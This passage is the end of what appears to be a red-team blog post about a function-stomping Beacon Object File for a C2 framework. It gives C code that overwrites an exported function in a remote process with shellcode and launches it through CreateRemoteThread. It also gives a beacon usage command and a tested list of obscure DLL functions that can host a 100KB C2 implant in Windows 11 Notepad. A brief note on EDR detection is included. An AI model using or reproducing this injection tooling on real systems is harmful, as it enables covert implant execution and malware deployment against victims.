| Step | API | Effect |
|------|-----|--------|
| 1 | `VirtualProtectEx(RW)` | Unprotect the code page |
| 2 | `WriteProcessMemory` | Overwrite original bytes with shellcode |
| 3 | `VirtualProtectEx(RWX)` | Make it executable again |

**Why `PAGE_EXECUTE_READWRITE` (not just `PAGE_EXECUTE_READ`)?** The shellcode needs read+write+execute. Using RWX is simpler than restoring the original protection flags, and ensures the shellcode can access any self-referencing data.

#### Phase G: Optional Trigger (Lines 392–412)

```c
    if (trigger) {
        HANDLE hThread = KERNEL32$CreateRemoteThread(hProc, NULL, 0,
                                                       (LPTHREAD_START_ROUTINE)func_addr,
                                                       NULL, 0, NULL);
        if (!hThread) {
            BeaconPrintf(CALLBACK_ERROR, "[!] funcstomp: CreateRemoteThread failed: %lu (stomp still applied)\n",
                         (unsigned long)KERNEL32$GetLastError());
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] funcstomp: remote thread created\n");
            /* Keep wait under 5s to avoid killing beacon comms */
            DWORD w = KERNEL32$WaitForSingleObject(hThread, 5000);
            if (w == WAIT_OBJECT_0) {
                DWORD ec = 0;
                KERNEL32$GetExitCodeThread(hThread, &ec);
                BeaconPrintf(CALLBACK_OUTPUT, "[+] funcstomp: thread exited (code 0x%lx)\n", (unsigned long)ec);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[*] funcstomp: thread still running (5s timeout, shellcode alive)\n");
            }
            KERNEL32$CloseHandle(hThread);
        }
    }
```

- Thread entry point = the **stomped function address** (which is now shellcode)
- No parameter is passed (`NULL`)
- Waits up to **5 seconds**:
  - **Exited** → shellcode ran to completion (e.g. a one-shot payload)
  - **Still running** → shellcode is alive in a loop (e.g. a C2 beacon) - **this is the success case** for implant beacons

The 5-second cap prevents the beacon from stalling in `WaitForSingleObject` and missing its next checkin/sleep cycle.

#### Phase H: Cleanup (Lines 414–418)

```c
    KERNEL32$CloseHandle(hProc);

    BeaconPrintf(CALLBACK_OUTPUT, "[=] funcstomp: done - %s::%s in PID %d\n",
                 dll_name, func_name, pid);
    return 0;
```

---

## Return Codes

| Code | Meaning |
|------|---------|
| 0 | Success |
| 1 | Invalid parameters |
| 2 | Module not found in target |
| 3 | `OpenProcess` failed (access denied / bad PID) |
| 4 | Memory allocation failure |
| 5 | No exports found in module |
| 6 | Function not in export table |
| 7 | `VirtualProtectEx(RW)` failed |
| 8 | `WriteProcessMemory` failed |
| 9 | `VirtualProtectEx(RX)` failed |

---

## Key Design Decisions

| Decision | Rationale |
|----------|-----------|
| Heap-allocate export arrays | Beacon stack is 1 MB; `export_entry_t[8192]` ≈ 512 KB would overflow it |
| Best-effort SeDebug | Avoids hard-failing on non-admin beacons; still works on user-level processes |
| 5s thread wait cap | Prevents the beacon from hanging and missing its next checkin |
| `PAGE_EXECUTE_READWRITE` final state | Simpler than restoring original protection; shellcode stays RWX |
| DFR for msvcrt malloc/free | Beacon's 32-entry function table lacks `calloc`/`free`; msvcrt's work via DFR |
| `strcasecmp_a` / `cpyn` inline | `lstrcpynA` and `_stricmp` not in the beacon's symbol table |

---

## Usage (from Beacon)

```
beacon> stomp [PID] "WinUIEdit.dll" "RichEditWndProc" /home/g3tsyst3m/agent.x64.bin -t 1
```

- `trigger=1` → the stomped function executes immediately via `CreateRemoteThread`
- `trigger=0` → shellcode sits in memory until the target naturally calls that export (e.g. the next `WndProc` invocation)

---

## Security Notes

- **No ASLR bypass needed**: The module base is read from the target's own module list (Toolhelp snapshot), so you get the actual loaded address.
- **No CFG issues**: You're overwriting code at an existing address; CFG validates the *target* of indirect calls, not the code at those targets.
- **Detection surface**: The `VirtualProtectEx(RW)` → `WriteProcessMemory` → `VirtualProtectEx(RWX)` sequence on a code page + `CreateRemoteThread` is a classic EDR detection pattern. The persistent RWX state is also a tell.
- **Shellcode size**: Capped at 1 MB in the BOF. In practice, stompping a 100 KB beacon into a 20-byte function overflows into adjacent code, which is fine as long as you don't need the rest of the module to function.


Choosing Your Sacrificial Function
-

This is the part I actually think about the most, so I'll be generous with it. Good sacrificial functions share three traits: **obscure** (little or no callers), **rarely invoked** (so the overwrite doesn't matter even if something *does* call it), and **non-critical** (the process doesn't depend on them). From my own testing, here's what has worked well with a **100KB+** payload:

| DLL | Function | Why it's a good stomp victim |
|-----|----------|------------------------------|
| `WinUIEdit.dll` | `RichEditWndProc` | Only fires on edit-control interaction. Works in Win11 UWP Notepad - full beacon checkin confirmed. |
| `ieframe.dll` | `IECreateFile` | Legacy IE; rarely loaded, and no modern app calls it. |
| `mscms.dll` | `CMSOpenProfile` | Color management; infrequent. |
| `midimap.dll` | `midiOutShortMsg` | MIDI; basically never used on modern systems. |
| `cabinet.dll` | `CABReadCabinetDirectory` | CAB file ops; rare. |

And the **don't** list:

- `ntdll.dll`, `kernel32.dll`, `kernelbase.dll`, `hal.dll` - the OS calls these constantly. Stomping them can take down the machine, not just the process.
- `IMM32.DLL` - the Input Method Manager is called on *every* text input message cycle. I stomped `ImmUnlockIMCC` + 100KB and overwrote dozens of adjacent IME functions; the next IME query from the UI thread hit the stomped range and I got an immediate `0xc0000005`. The exact same 100KB payload in `capauthz.dll` was fine. **Rule of thumb: for large payloads, make sure the *entire* stomped range is non-critical, not just the one function you named.**

And that's a wrap!

We went from "what does function stomping actually mean (versus the module stomping I wrote about before)" all the way to a working Adaptix BOF that stomps an exported function in a remote process, and a Crystal Palace PIC shellcode that runs wherever it lands. 
As always, the code is in the repos below. I hope this was informative and, as always, at least somewhat entertaining 😸 Appreciate you all and thanks for supporting what I do and reading the blog! Until next time!

***ANY.RUN Results***
-

(ANY.RUN results)[https://app.any.run/tasks/deabb311-db87-4225-b6d9-ae43d827969c?p=6ac2c4544f8a4970814600a8]

<div style="text-align: right;">
  
<b>Sponsored By:</b><br>

<img width="200" height="130" alt="image" src="https://raw.githubusercontent.com/g3tsyst3m/g3tsyst3m.github.io/refs/heads/master/assets/images/anyrun.png" />

<img width="200" height="130" alt="image" src="https://raw.githubusercontent.com/g3tsyst3m/g3tsyst3m.github.io/refs/heads/master/assets/images/vector35.png" />

</div>
